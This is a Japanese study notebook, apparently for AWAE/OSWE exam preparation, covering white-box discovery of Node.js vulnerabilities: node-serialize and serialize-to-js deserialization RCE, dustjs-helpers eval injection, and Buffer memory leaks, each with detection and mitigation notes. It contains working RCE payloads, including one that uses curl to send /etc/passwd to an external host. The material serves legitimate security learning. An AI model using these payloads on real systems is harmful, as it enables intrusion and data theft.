<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [AWAE-preparation](#awae-preparation)
- [脆弱性発見方法](#%E8%84%86%E5%BC%B1%E6%80%A7%E7%99%BA%E8%A6%8B%E6%96%B9%E6%B3%95)
  - [キーワード](#%E3%82%AD%E3%83%BC%E3%83%AF%E3%83%BC%E3%83%89)
    - [Node.js](#nodejs)
- [Vuln](#vuln)
  - [sample](#sample)
  - [Deserialization](#deserialization)
    - [nodejs-serialize (CVE-2017-5941)](#nodejs-serialize-cve-2017-5941)
    - [serialize-to-js (Node.js)](#serialize-to-js-nodejs)
  - [Command Injection](#command-injection)
    - [dustjs-helper (Node.js)](#dustjs-helper-nodejs)
  - [Information leak](#information-leak)
    - [new Buffer(100); (Node.js)](#new-buffer100-nodejs)
- [その他](#%E3%81%9D%E3%81%AE%E4%BB%96)
  - [githubのOSSのディレクトリ構成](#github%E3%81%AEoss%E3%81%AE%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA%E6%A7%8B%E6%88%90)
- [メモ](#%E3%83%A1%E3%83%A2)
- [参考資料](#%E5%8F%82%E8%80%83%E8%B3%87%E6%96%99)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# AWAE-preparation

# 脆弱性発見方法
エラー文が出て入れば、その該当箇所のソースコードをgithubで探して、wikiとかTutorialとかissueを見る。   
Injection系はevalを探す。   
見つかれば、ユーザーの入力をエスケープするような部分を`html`,`escape`とかのキーワードで検索して見つける。   
## キーワード
### Node.js
`eval`,`eval(`,`html`,`escape`,`new Buffer(`,`unserialize`,`node-serialize`,`deserialize`,`new Function`   
### Java Deserialization
`readObject`,`readExternal`,`readUnshared`,`XStream`,`AC ED`で始まるバイトストリーム(Serializeされたことを示すマジックナンバー)、`ObjectInputStream`,`ObjectOutputStream`,`defaultReadObject`,`Apache Commons Collections`
# Vuln
## sample
- 概要   
- 例   
- 発見方法   
- 対策   
- 参考資料   
## Deserialization
### nodejs-serialize (CVE-2017-5941)
- 概要   
Node.jsのnode-serializeパッケージ0.0.4のunserialize（）関数に渡された信頼できないデータを悪用して、即時呼び出し関数式（IIFE）を使用してJavaScriptオブジェクトを渡すことにより、任意のコードを実行できる。   
https://www.cvedetails.com/cve/CVE-2017-5941/   
cvedetails   
https://github.com/luin/serialize/issues/4   
node-serializeのissue。   
- 例   
```js
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())

app.get('/', function(req, res) {
  if (req.cookies.profile) {
    // Cookieのprofileの値をbase64デコード
    var str = new Buffer(req.cookies.profile,
    'base64').toString();
    // ここが脆弱！
    // Cookieの値をbase64デコードしたものを逆シリアライズする
    var obj = serialize.unserialize(str);
    // Cookieの中の値を逆シリアライズによってオブジェクトにして、値を取り出す
    if (obj.username) {
    res.send("Hello " + escape(obj.username));
      }
    } else {
      res.cookie('profile',
      "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5Ijo
      iYmFuZ2Fsb3JlIn0=", { maxAge: 900000, httpOnly: true});
    }
  res.send("Hello World");
});

app.listen(3000);
```
`serialize.unserialize(str)`が脆弱。   
この逆シリアライズする中に、IIFE形式の関数があれば逆シリアライズしたときに呼び出されなくても自動的に実行する。   
```txt
> var x = {'a': function(){console.log('a')}}  // 普通。宣言しただけでは実行されない
undefined
> x.a
[Function: a]
> x.a();  // メソッドを指定して初めて実行される
a
undefined
> var x = {'a': function(){console.log('a')}()}  // IIFE形式。最後に()を足す
a         // 宣言したときにすぐに実行される！
undefined
> 
```
よって、以下のようなシリアライズされた文字列に`()`を付け足してIIFE形式にすることで、逆シリアライズ時に即時実行される。   
ここでは、`{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()"}`をbase64エンコードしたものをCookieにセットするとRCEできる！   
```txt
> var serialize = require('node-serialize');
> var poc = {x: function(){console.log("POC")} }
undefined
> serialize.serialize(poc)
'{"x":"_$$ND_FUNC$$_function(){console.log(\\"POC\\")}"}'
> var y = { rce : function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}, }
undefined
> serialize.serialize(y)
`{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}"}`
```

- 発見方法   
`unserialize`,`require('node-serialize')`キーワードが含まれているかどうか。   
`node_modules`ディレクトリの中にversion 0.0.4(おそらく最新版でも)の`node-serialize`ディレクトリがあるかどうか。   
- 対策   
`node-serialize`モジュールは最新版でもおそらく修正されてない。   
https://www.npmjs.com/package/node-serialize   
- 参考資料   
https://blacksheephacks.pl/nodejs-deserialization/   
説明。   
https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf   
説明。   
https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py   
`eval(String.fromCharCode(10,118,...,10))`の形式で書けばクウォートとかを使わずにReverse shellのコードが書ける。   
https://v3ded.github.io/ctf/htb-celestial   
HTBのWriteup。   
- 根本の原因   
このソースの`unserialize`関数の`eval`が良くない。   
https://github.com/luin/serialize/blob/master/lib/serialize.js   
```js
  var FUNCFLAG = '_$$ND_FUNC$$_';
  
  // ここら辺は省略
  
  // objは {"a":"test1","b":"test2"} とか
  unserialize = function(obj, originObj) {
    var isIndex;
    if (typeof obj === 'string') {
      obj = JSON.parse(obj);
      isIndex = true;
    }
    originObj = originObj || obj;

    var circularTasks = [];
    var key;
    // objオブジェクトのプロパティをkeyに代入。 "a","b"が順次代入される    
    for(key in obj) {
      if(obj.hasOwnProperty(key)) {
        if(typeof obj[key] === 'object') {
          obj[key] = unserialize(obj[key], originObj);
          // obj["a"]つまり"test1"がString型かどうかチェック
        } else if(typeof obj[key] === 'string') {
          // indexOfで"_$$ND_FUNC$$_"の位置を検査。先頭にあるかどうか
          if(obj[key].indexOf(FUNCFLAG) === 0) {
            // ここが脆弱！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
            // substringで"_$$ND_FUNC$$_"以降の文字を切り出して、evalで実行！
            obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')');
          } else if(obj[key].indexOf(CIRCULARFLAG) === 0) {
            obj[key] = obj[key].substring(CIRCULARFLAG.length);
            circularTasks.push({obj: obj, key: key});
          }
        }
      }
    }

    if (isIndex) {
      circularTasks.forEach(function(task) {
        task.obj[task.key] = getKeyPath(originObj, task.obj[task.key]);
      });
    }
    return obj;
  };
```
### serialize-to-js (Node.js)
- 概要   
serialize-to-jsモジュールのversion 1.0.0以前で、deserializeメソッドでIIFE形式によるRCEの脆弱性がある。   
https://snyk.io/vuln/npm:serialize-to-js:20170208   
- 例   
以下を挿入するとRCEできる！   
```js
var payload = "{e: function(){ eval('console.log(`exploited`)') }() }";
```
- 対策   
修正されてる。現在のバージョンは
- 根本の原因   
ここに該当のissueがある。   
https://github.com/commenthol/serialize-to-js/commit/1cd433960e5b9db4c0b537afb28366198a319429   
![image](https://user-images.githubusercontent.com/56021519/101511405-fb246280-39bd-11eb-9dd2-468226ae1b2e.png)   
`new Function`によって関数オブジェクトが作成されて、IIFE形式によって作成されたら即実行されてしまう。   
```js
var payload = "{e: function(){ eval('console.log(`exploited`)') }() }";
// もともとの脆弱な実装
var str = (new Function('return ' + payload))();

// 結果
// exploited
```
修正バージョンでは`sanitize()`関数が実装されて、`new`,`eval`,`function`,`(`,`)`のキーワードを構文解析して、あるかどうか調べている。   
![image](https://user-images.githubusercontent.com/56021519/101512873-dda3c880-39be-11eb-8c91-4f159defc157.png)   

## Command Injection
### dustjs-helper (Node.js)
- 概要   
dustというNodeJSのモジュールの中の拡張機能であるdustjs-helper.jsというテンプレートエンジンのための便利メソッドがあるライブラリの中のifメソッドが脆弱だった。   
Javascriptのevalの中にユーザーの入力が入り込んでRCEできてしまう。   
htmlescapeはあるにはあるが、String型にしかチェックがされてないのでArray型にして入力すればHtmlEscape無しに入力できてしまう。   
- 例   

- 発見方法   
`/us/demo/navigation?device=desktop\`(%5c)を入力すると、500 internal errorが発生して、`scripts/node_modules/dustjs-helpers/lib/dust-helpers.js`の`Object.helpers.if`でSyntaxErrorが発生していることがわかる。   
なので、次は`dustjs-helpers/lib/dust-helpers.js`をgithubの公式で読む。   
`/dist`,`/lib`のどっちでも同じっぽい？？   
https://github.com/linkedin/dustjs-helpers/blob/03cd65f51a/dist/dust-helpers.js   
https://github.com/linkedin/dustjs-helpers/blob/03cd65f51a/lib/dust-helpers.js      
![image](https://user-images.githubusercontent.com/56021519/101359047-0eaccc00-38df-11eb-8c19-3e7b986d5b5b.png)   
`if helper`で検索すると該当箇所が見つかり、`eval`があることがわかる。   
if helperの挙動を確認するために、dustjsのgithubの**wiki**の**Dust tutorial**を読む。   
https://github.com/linkedin/dustjs/wiki/Dust-Tutorial#if_condcondition__if_helper_Removed_in_160_release   
見た感じ条件式をevalの中に入れてるっぽいらしい。   
つまり、`\`を入れると、`eval("'desktop\' === 'desktop'")`となってSyntaxErrorとなる。   
![image](https://user-images.githubusercontent.com/56021519/101359923-423c2600-38e0-11eb-875c-ce9b66c0bf69.png)   
任意のコマンドを実行するには`\`以外にも`'`とかも使う必要がある。ので、htmlEscapeする箇所を探して、そこら辺を探す。   
`escape`,`html`とかのキーワードで探すとよさそう？？   
https://github.com/linkedin/dustjs/blob/master/dist/dust-core.js   
どうやら`String`型の時しかEscapeされてないらしい。   
![image](https://user-images.githubusercontent.com/56021519/101360732-69dfbe00-38e1-11eb-9cfd-e98794fedb98.png)   
`?device=desktop`みたいにパラメータを渡す代わりに、`?device[]=1&device[]=2`みたいにして`Array`型でパラメータを渡せばEscapeされずにそのままevalまでたどり着きそう！   
Array型いきなり渡してもいいんだ…！？ふーん。   
`?device[]=x&device[]=y'-require('child_process').exec('curl+-F+"x=`cat+/etc/passwd`"+artsploit.com')-'`   
とするとRCEできるらしい！！！   
これは以下のようになるから。   
```js
// 元はこれ
eval("  ''  == 'desktop'  ")

// 上にPayloadを挿入するとこうなる。-は文字列の引き算？
> eval("  'y'-require('child_process').exec('cat /etc/passwd > ../nodejs/output')-''  == 'desktop'  "); 
false

// +でも-でもどっちでもよさそう
> eval("  'y'+require('child_process').exec('cat /etc/passwd > ../nodejs/output')+''  == 'desktop'  "); 
false
> 
```
- 対策   
evalの入力検証を実装する。htmlEscapeはString型だけじゃなくてすべての型で行う。   
- 参考資料   
https://artsploit.blogspot.com/2016/08/pprce2.html   
https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/   

## Information leak
### new Buffer(100); (Node.js)
- 概要   
Node.jsで以下のように`new Buffer(req.body.text)`でバッファを作成した場合、`req.body.text`の型がString型でない場合、Bufferはnewで使用される前に初期化されないので、サーバーのメモリを返す脆弱性。   
- 例   
```js
> console.log(new Buffer('aaaa'));
<Buffer 61 61 61 61>
undefined
> console.log(new Buffer(100));
<Buffer 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ... 50 more bytes>
undefined
>
```
つまり、ログイン処理で以下のようになっており、POST形式にはJSONが使われている場合、リクエストを細工することでメモリをリークできる。   
```js
        var password = new Buffer(req.body.password);
        if(password.toString('base64') == config.secret_password) {
            req.session.admin = 'yes';
            res.json({'status': 'ok' });
        } else {
            res.json({'status': 'error', 'error': 'password wrong: '+password.toString() });
            
// POSTするデータ
// {"password":"test"} // 文字列"test"を送信。通常
// {"password":100}    // 数値100を送信。Buffer(100)が.toString()によってリークされる
```
- 発見方法   
`new Buffer();`が書かれている箇所を探す。   
- 対策   
`new Bufffer()`は危険なのでBufferの代わりに、Buffer.fromとBuffer.allocとBuffer.allocUnsafeが追加された。   
Buffer.allocUnsafeは初期化されないが、それ以外は初期化されるっぽい。   
- 参考資料   
https://techblog.yahoo.co.jp/advent-calendar-2016/node_new_buffer/   
概要   
https://www.smrrd.de/nodejs-hacking-challenge-writeup.html   
Writeup   
# その他
## githubのOSSのディレクトリ構成
- bin   
プロジェクトで使用する、各種コマンド置き場   
- dist   
コンパイルされたコード/ライブラリ。public/またはbuild/とも呼ばれる。通常、本番用または公共用のファイル。ライブラリ本体置き場（ビルド時に自動作成される）。配付するもの   
- lib   
外部依存関係（直接含まれる場合）。外部ライブラリ置き場   
- include   
C/C++ヘッダー   
- test   
プロジェクトのテストスクリプト、モックなど。性能チェックとか。   
- src   
プロジェクトをビルドおよび開発するための「ソース」ファイル。これは、dist/、public/、またはbuild/にコンパイルされる前の元のソースファイルの場所。   
- examples   
使用例。   
- vendor   
Composerが使用するPHPパッケージのライブラリと依存関係が含まれる。   
- contrib   
他の人からの貢献   
- doc   
ドキュメント   
- man   
マニュアル（Unix/Linux）   

# メモ
とにかくコードを読みなれている必要があるらしい。それが一番大事っぽい。それが今全然できないしHTBやっててもそれは伸びない気がする。   
まずはudemyとかpentesterAcademyのPHP,NodeJS,.net,JavaのWebアプリ開発コースを受講する必要がありそう。   
あとは脆弱性ごとにそれに該当するコード群と発見方法、着眼点とかを自分なりにまとめる必要がありそう。CVEとかも参考にした方がよさそう。   
受講は2月の春休み開始直後から1カ月でとりたい！それまでにいろいろ計画的に勉強するべし！

# 参考資料
https://alex-labs.com/my-awae-review-becoming-an-oswe/   
ホワイトボックスの方法論的なことが書いてある。超参考になりそう。   
   
https://stacktrac3.co/oswe-review-awae-course/   
こっちにも方法論的なことが書いてある。   
